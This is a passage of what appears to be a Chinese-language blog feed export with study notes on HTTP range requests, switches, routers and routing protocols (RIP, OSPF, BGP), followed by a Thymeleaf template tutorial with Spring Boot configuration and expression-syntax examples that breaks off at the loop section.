<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Range: bytes 100-999&#x2F;1000</span><br></pre></td></tr></table></figure>

<p>在这个例子中，会传递 <code>100 ~ 999</code> 范围的内容实体，而该资源文件的总大小是 1000 bytes。并且此时的 HTTP 响应状态码为 <code>206 Partial Content</code> 。</p>
<p><code>HTTP 206 Partial Content</code> 成功状态响应代码表示请求已成功，并且主体包含所请求的数据区间，该数据区间是在请求的 <code>Range</code> 首部指定的。</p>
<h2 id="针对下载过程中资源发生变化的情况"><a href="#针对下载过程中资源发生变化的情况" class="headerlink" title="针对下载过程中资源发生变化的情况"></a>针对下载过程中资源发生变化的情况</h2><p>当我们在一些下载工具中，下载大尺寸资源的时候，偶尔中间暂停过再重新下载，可能会遇见它又重头开始下载的情况。</p>
<p>这看似是 HTTP 的范围请求失效了，但是实际上并不一定如此，很可能是因为请求的资源，在请求的这个过程中，发生了改变。</p>
<p>假如你下载的过程中，下载的源资源文件发生了变化，但是 URL 没有改变，此时文件长度可能已经变化了（这是非常容易发现的），极端情况下就算没有长度没有变化，你再继续下载，很可能最终下载完成之后，无法将下载的内容拼接成我们需要的文件。</p>
<p>如果我们需要从服务器上下载某个资源，一定要预防此资源可能发生的变动。在 HTTP 协议中，可以通过 <code>ETag</code> 或者 <code>Last-Modified</code> 来标识当前资源是否变化。</p>
<ul>
<li><code>ETag</code>：当前文件的一个验证令牌指纹，用于标识文件的唯一性。</li>
<li><code>Last-Modified</code>：标记当前文件最后被修改的时间。</li>
</ul>
<p>在 HTTP 的范围请求中，也可以使用这两个字段来区分分段请求的资源，是否有修改过，只需要在请求头中，将它放在 <code>If-Range</code> 这个请求报文头中即可。<code>If-Range</code> 使用 <code>ETag</code> 或者 <code>Last-Modified</code> 两个参数任意一个，原样填入即可。</p>
<p>此时，如果两次操作的都是同一个资源文件，就会继续返回 206 状态码，开始后续的操作，反之则会返回 200 状态码，表示文件发生改变，要从头下载。</p>
<p>需要注意的是 <code>If-Range</code> 需要和 <code>Range</code> 配合起来使用，否则会被服务端忽略。</p>
<p>再额外提一点，如果客户端请求报文头中，对 <code>Range</code> 填入的范围错误，会返回 <code>416</code> 状态码。</p>
<blockquote>
<p>HTTP 416 Range Not Satisfiable 错误状态码意味着服务器无法处理所请求的数据区间。最常见的情况是所请求的数据区间不在文件范围之内，也就是说，Range 首部的值，虽然从语法上来说是没问题的，但是从语义上来说却没有意义。</p>
</blockquote>
<h1 id="33-交换机"><a href="#33-交换机" class="headerlink" title="33. 交换机"></a>33. 交换机</h1><p>交换机属于数据链路层，具有自学习能力，学习的是交换表的内容，交换表中存储着 MAC 地址到接口的映射。</p>
<p>正是由于这种自学习能力，因此交换机是一种即插即用设备，不需要网络管理员手动配置交换表内容。</p>
<p>下图中，交换机有 4 个接口，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的映射写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送广播帧，主机 C 和主机 D 会丢弃该帧，主机 B 回应该帧向主机 A 发送数据包时，交换机查找交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机添加主机 B 到接口 2 的映射。</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E4%BA%A4%E6%8D%A2%E6%9C%BA.png" alt="交换机"></p>
<h1 id="34-路由器"><a href="#34-路由器" class="headerlink" title="34. 路由器"></a>34. 路由器</h1><h2 id="路由器的结构"><a href="#路由器的结构" class="headerlink" title="路由器的结构"></a>路由器的结构</h2><p>路由器从功能上可以划分为：路由选择和分组转发。</p>
<p>分组转发结构由三个部分组成：交换结构、一组输入端口和一组输出端口。</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E7%BB%93%E6%9E%84.jpeg" alt="路由器的结构"></p>
<h2 id="路由器分组转发流程"><a href="#路由器分组转发流程" class="headerlink" title="路由器分组转发流程"></a>路由器分组转发流程</h2><p>在路由器中的输入和输出端口之间没有直接连线，路由器在处理分组的过程中，会先把收到的分组放入缓存，接着查找转发表，找出到某个地址应该从哪个端口转发，再把分组送到适合的端口转发出去，具体过程如下：</p>
<ul>
<li>从数据报的首部提取目的主机的 IP 地址 D，得到目的网络地址 N。</li>
<li>若 N 就是与此路由器直接相连的某个网络地址，则进行直接交付；</li>
<li>若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给表中所指明的下一跳路由器；</li>
<li>若路由表中有到达网络 N 的路由，则把数据报传送给路由表中所指明的下一跳路由器；</li>
<li>若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器；</li>
<li>报告转发分组出错。</li>
</ul>
<p><img src="http://qiniu.xiaoming.net.cn/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%86%E7%BB%84%E8%BD%AC%E5%8F%91%E6%B5%81%E7%A8%8B.jpeg" alt="路由器分组转发流程"></p>
<h2 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h2><p>路由选择协议都是自适应的，能随着网络通信量和拓扑结构的变化而自适应地进行调整。</p>
<p>互联网可以划分为许多较小的自治系统 AS，一个 AS 可以使用一种和别的 AS 不同的路由选择协议。</p>
<p>可以把路由选择协议划分为两大类：</p>
<ul>
<li>自治系统内部的路由选择：RIP 和 OSPF</li>
<li>自治系统间的路由选择：BGP</li>
</ul>
<h3 id="内部网关协议-RIP"><a href="#内部网关协议-RIP" class="headerlink" title="内部网关协议 RIP"></a>内部网关协议 RIP</h3><p>RIP 是一种基于距离向量的路由选择协议。距离是指跳数，直接相连的路由器跳数为 1。跳数最多为 15，超过 15 表示不可达。</p>
<p>RIP 按固定的时间间隔仅和相邻路由器交换自己的路由表，经过若干次交换之后，所有路由器最终会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器地址。</p>
<h4 id="距离向量算法："><a href="#距离向量算法：" class="headerlink" title="距离向量算法："></a>距离向量算法：</h4><ul>
<li>对地址为 X 的相邻路由器发来的 RIP 报文，先修改报文中的所有项目，把下一跳字段中的地址改为 X，并把所有的距离字段加 1；</li>
<li>对修改后的 RIP 报文中的每一个项目，进行以下步骤：</li>
</ul>
<ol>
<li>若原来的路由表中没有目的网络 N，则把该项目添加到路由表中；</li>
<li>否则：若下一跳路由器地址是 X，则把收到的项目替换原来路由表中的项目；否则：若收到的项目中的距离 d 小于路由表中的距离，则进行更新（例如原始路由表项为 Net2, 5, P，新表项为 Net2, 4, X，则更新）；否则什么也不做。</li>
<li>若 3 分钟还没有收到相邻路由器的更新路由表，则把该相邻路由器标为不可达，即把距离置为 16。</li>
</ol>
<p>RIP 协议实现简单，开销小。但是 RIP 能使用的最大距离为 15，限制了网络的规模。并且当网络出现故障时，要经过比较长的时间才能将此消息传送到所有路由器。</p>
<h3 id="内部网关协议-OSPF"><a href="#内部网关协议-OSPF" class="headerlink" title="内部网关协议 OSPF"></a>内部网关协议 OSPF</h3><p>开放最短路径优先 OSPF，是为了克服 RIP 的缺点而开发出来的。</p>
<p>开放表示 OSPF 不受某一家厂商控制，而是公开发表的；最短路径优先表示使用了 Dijkstra 提出的最短路径算法 SPF。</p>
<p>OSPF 具有以下特点：</p>
<ul>
<li>向本自治系统中的所有路由器发送信息，这种方法是洪泛法。</li>
<li>发送的信息就是与相邻路由器的链路状态，链路状态包括与哪些路由器相连以及链路的度量，度量用费用、距离、时延、带宽等来表示。</li>
<li>只有当链路状态发生变化时，路由器才会发送信息。</li>
<li>所有路由器都具有全网的拓扑结构图，并且是一致的。相比于 RIP，OSPF 的更新过程收敛的很快。</li>
</ul>
<h3 id="外部网关协议-BGP"><a href="#外部网关协议-BGP" class="headerlink" title="外部网关协议 BGP"></a>外部网关协议 BGP</h3><p>BGP（Border Gateway Protocol，边界网关协议）</p>
<p>AS 之间的路由选择很困难，主要是由于：</p>
<ul>
<li>互联网规模很大；</li>
<li>各个 AS 内部使用不同的路由选择协议，无法准确定义路径的度量；</li>
<li>AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。</li>
<li>BGP 只能寻找一条比较好的路由，而不是最佳路由。</li>
</ul>
<p>每个 AS 都必须配置 BGP 发言人，通过在两个相邻 BGP 发言人之间建立 TCP 连接来交换路由信息。</p>
<p><img src="http://qiniu.xiaoming.net.cn/BGP%E5%8F%91%E8%A8%80%E4%BA%BA%E5%92%8C%E8%87%AA%E6%B2%BB%E7%B3%BB%E7%BB%9FAS%E7%9A%84%E5%85%B3%E7%B3%BB.png" alt="BGP 发言人与 AS 自治系统的关系"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>thymeleaf</title>
    <url>/2021/04/03/Thymeleaf/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Thymeleaf是用来开发Web和独立环境项目的服务器端的 Java 模板引擎</p>
<p>Spring官方支持的服务的渲染模板中包含<code>Thymeleaf</code>和<code>Freemaker</code>等，而Thymeleaf与SpringMVC的视图技术，及SpringBoot的自动化配置集成非常完美，几乎没有任何成本，你只用关注Thymeleaf的语法即可。</p>
<a id="more"></a>

<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
<li>支持html原型，在html标签增加额外的属性达到模板+数据的展示方式。浏览器解释 html 时会忽略未定义的标签属性，所以 thymeleaf 的模板可以静态地运行；当有数据返回到页面时<code>Thymeleaf</code> 标签会动态地替换掉静态内容，使页面动态显示</li>
<li>与SpringBoot完美整合，SpringBoot提供了Thymeleaf的默认配置，并且为Thymeleaf设置了视图解析器，我们可以像以前操作jsp一样来操作Thymeleaf。</li>
</ol>
<h1 id="整合SpringBoot"><a href="#整合SpringBoot" class="headerlink" title="整合SpringBoot"></a>整合SpringBoot</h1><ol>
<li>pom.xml</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>yml</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">thymeleaf:</span></span><br><span class="line">    <span class="attr">prefix:</span> <span class="string">classpath:/templates/</span></span><br><span class="line">    <span class="attr">suffix:</span> <span class="string">.html</span></span><br><span class="line">    <span class="attr">mode:</span> <span class="string">LEGACYHTML5</span></span><br><span class="line">    <span class="attr">encoding:</span> <span class="string">UTF-8</span></span><br><span class="line">    <span class="attr">cache:</span> <span class="literal">false</span> <span class="comment">#关闭Thymeleaf的缓存</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>Controller</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;hhhhh&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>html</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HELLO<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span>hsjk<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>Thymeleaf的主要作用是把model中的数据渲染到html中，因此其语法主要是如何<strong>解析</strong>model中的数据。</p>
<h2 id="添加model"><a href="#添加model" class="headerlink" title="添加model"></a>添加model</h2><ol>
<li>将模型数据添加到model</li>
<li>返回 .html 前缀</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;test2&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test2</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">    User user = <span class="keyword">new</span> User();</span><br><span class="line">    user.setAge(<span class="number">21</span>);</span><br><span class="line">    user.setName(<span class="string">&quot;Jackson&quot;</span>);</span><br><span class="line">    user.setFriend(<span class="keyword">new</span> User(<span class="string">&quot;李小龙&quot;</span>, <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line">    model.addAttribute(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello2&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="渲染数据"><a href="#渲染数据" class="headerlink" title="渲染数据"></a>渲染数据</h2><ol>
<li>解析<code> $&#123;user.name&#125;</code></li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.name&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>Thymeleaf中所有的表达式都需要写在”指令”中，指令是HTML5中的自定义属性，在Thymeleaf中所有指令都是以<code>th:</code>开头。因为表达式<code>$&#123;user.name&#125;</code>是写在自定义属性中，因此在静态环境下，表达式的内容会被当做是普通字符串，浏览器会自动忽略这些指令，这样就不会报错了。</p>
<p>如果我们不经过SpringMVC，而是直接用浏览器打开编写的页面：在静态环境下,th指令不会被识别，但是也不会报错，而是显示<span>标签的缺省默认值：”请跟我来”</p>
<p>指令的设计，正是Thymeleaf的高明之处，也是它优于其它模板引擎的原因。动静结合的设计，使得无论是前端开发人员还是后端开发人员可以完美契合。</p>
<p><strong>注意</strong></p>
<ol>
<li><p>如果浏览器不支持Html5怎么办？</p>
<p>如果不支持这种<code>th:</code>的命名空间写法，那么可以把<code>th:text</code>换成 <code>data-th-text</code>，Thymeleaf也可以兼容。</p>
</li>
<li><p><code>th:text</code>指令出于安全考虑，会把表达式读取到的值进行处理，防止html的注入。</p>
<p>例如，<code>&lt;p&gt;你好&lt;/p&gt;</code>将会被格式化输出为<code>$lt;p$gt;你好$lt;/p$lt;</code>。如果想要不进行格式化输出，而是要输出原始内容，则使用<code>th:utext</code>来代替.</p>
</li>
</ol>
<h3 id="自定义变量"><a href="#自定义变量" class="headerlink" title="自定义变量"></a>自定义变量</h3><p>当数据量比较多的时候，频繁的写<code>user.</code>就会非常麻烦。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">th:object</span>=<span class="string">&quot;$&#123;user&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Name: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;name&#125;&quot;</span>&gt;</span>Jack<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Age: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;age&#125;&quot;</span>&gt;</span>21<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>friend: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;friend.name&#125;&quot;</span>&gt;</span>Rose<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>首先在 <code>h2</code>上 用 <code>th:object=&quot;$&#123;user&#125;&quot;</code>获取user的值，并且保存</li>
<li>然后，在<code>h2</code>内部的任意元素上，可以通过 <code>*&#123;属性名&#125;</code>的方式，来获取user中的属性，这样就省去了大量的<code>user.</code>前缀了</li>
</ul>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>ognl表达式本身就支持方法调用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">th:object</span>=<span class="string">&quot;$&#123;user&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>FirstName: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;name.split(&#x27; &#x27;)[0]&#125;&quot;</span>&gt;</span>Jack<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>LastName: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;name.split(&#x27; &#x27;)[1]&#125;&quot;</span>&gt;</span>Li<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里我们调用了name（是一个字符串）的split方法。</li>
</ul>
<h3 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h3><p>Thymeleaf中提供了一些内置对象，并且在这些对象中提供了一些方法，方便我们来调用。获取这些对象，需要使用<code>#对象名</code>来引用。</p>
<ul>
<li>一些环境相关对象</li>
</ul>
<table>
<thead>
<tr>
<th>对象</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>#ctx</code></td>
<td>获取Thymeleaf自己的Context对象</td>
</tr>
<tr>
<td><code>#requset</code></td>
<td>如果是web程序，可以获取HttpServletRequest对象</td>
</tr>
<tr>
<td><code>#response</code></td>
<td>如果是web程序，可以获取HttpServletReponse对象</td>
</tr>
<tr>
<td><code>#session</code></td>
<td>如果是web程序，可以获取HttpSession对象</td>
</tr>
<tr>
<td><code>#servletContext</code></td>
<td>如果是web程序，可以获取HttpServletContext对象</td>
</tr>
</tbody></table>
<ul>
<li>Thymeleaf提供的全局对象：</li>
</ul>
<table>
<thead>
<tr>
<th>对象</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>#dates</code></td>
<td>处理java.util.date的工具对象</td>
</tr>
<tr>
<td><code>#calendars</code></td>
<td>处理java.util.calendar的工具对象</td>
</tr>
<tr>
<td><code>#numbers</code></td>
<td>用来对数字格式化的方法</td>
</tr>
<tr>
<td><code>#strings</code></td>
<td>用来处理字符串的方法</td>
</tr>
<tr>
<td><code>#bools</code></td>
<td>用来判断布尔值的方法</td>
</tr>
<tr>
<td><code>#arrays</code></td>
<td>用来护理数组的方法</td>
</tr>
<tr>
<td><code>#lists</code></td>
<td>用来处理List集合的方法</td>
</tr>
<tr>
<td><code>#sets</code></td>
<td>用来处理set集合的方法</td>
</tr>
<tr>
<td><code>#maps</code></td>
<td>用来处理map集合的方法</td>
</tr>
</tbody></table>
<p>ps：我们在环境变量中添加日期类型对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;test3&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">show3</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;today&quot;</span>, <span class="keyword">new</span> Date());</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello3&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在页面中处理(根据today变量属性值，再根据dates对象进行格式化)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  今天是: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#dates.format(today,&#x27;yyyy-MM-dd&#x27;)&#125;&quot;</span>&gt;</span>2018-04-25<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="字面值"><a href="#字面值" class="headerlink" title="字面值"></a>字面值</h2><p>有的时候，我们需要在指令中填写基本类型如：字符串、数值、布尔等，并不希望被Thymeleaf解析为变量，这个时候称为字面值。</p>
<h3 id="字符串字面值"><a href="#字符串字面值" class="headerlink" title="字符串字面值"></a>字符串字面值</h3><p>使用一对<code>&#39;</code>引用的内容就是字符串字面值了：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  你正在观看 <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;&#x27;thymeleaf&#x27;&quot;</span>&gt;</span>template<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 的字符串常量值.</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>th:text</code>中的thymeleaf并不会被认为是变量，而是一个字符串</p>
<h3 id="数字字面值"><a href="#数字字面值" class="headerlink" title="数字字面值"></a>数字字面值</h3><p>数字不需要任何特殊语法， 写的什么就是什么，而且可以直接进行算术运算</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>今年是 <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;2018&quot;</span>&gt;</span>1900<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>两年后将会是 <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;2018 + 2&quot;</span>&gt;</span>1902<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="布尔字面值"><a href="#布尔字面值" class="headerlink" title="布尔字面值"></a>布尔字面值</h3><p>布尔类型的字面值是true或false：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:if</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    你填的是true</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里引用了一个<code>th:if</code>指令，跟vue中的<code>v-if</code>类似</p>
<h2 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h2><p>我们经常会用到普通字符串与表达式拼接的情况：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;&#x27;欢迎您:&#x27; + $&#123;user.name&#125; + &#x27;!&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>字符串字面值需要用<code>&#39;&#39;</code>，拼接起来非常麻烦，Thymeleaf对此进行了简化，使用一对<code>|</code>即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;|欢迎您:$&#123;user.name&#125;|&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h2><p>需要注意：<code>$&#123;&#125;</code>内部的是通过OGNL表达式引擎解析的，外部的才是通过Thymeleaf的引擎解析，因此运算符尽量放在<code>$&#123;&#125;</code>外进行。</p>
<h3 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h3><p>支持的算术运算符：<code>+ - * / %</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.age&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>         //21</span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.age&#125;%2 == 0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>  //false</span><br></pre></td></tr></table></figure>

<h3 id="比较运算"><a href="#比较运算" class="headerlink" title="比较运算"></a>比较运算</h3><p>支持的比较运算：<code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code> and <code>&lt;=</code> ，但是<code>&gt;</code>, <code>&lt;</code>不能直接使用，因为xml会解析为标签，要使用别名。</p>
<p>注意 <code>==</code> and <code>!=</code>不仅可以比较数值，类似于equals的功能。</p>
<p>可以使用的<strong>别名</strong>：<code>gt (&gt;), lt (&lt;), ge (&gt;=), le (&lt;=), not (!). Also eq (==), neq/ne (!=).</code></p>
<h3 id="条件运算"><a href="#条件运算" class="headerlink" title="条件运算"></a>条件运算</h3><h4 id="三元运算"><a href="#三元运算" class="headerlink" title="三元运算"></a>三元运算</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.sex&#125; ? &#x27;男&#x27;:&#x27;女&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h4><p>有的时候，我们取一个值可能为空，这个时候需要做非空判断，可以使用 <code>表达式 ?: 默认值</code>简写：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.name&#125; ?: &#x27;二狗&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>当前面的表达式值为null时，就会使用后面的默认值。</strong></p>
<p>注意：<code>?:</code>之间没有空格。</p>
<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>循环也是非常频繁使用的需求，我们使用<code>th:each</code>指令来完成：</p>
<p>假如有用户的集合：users在Context中。</p>
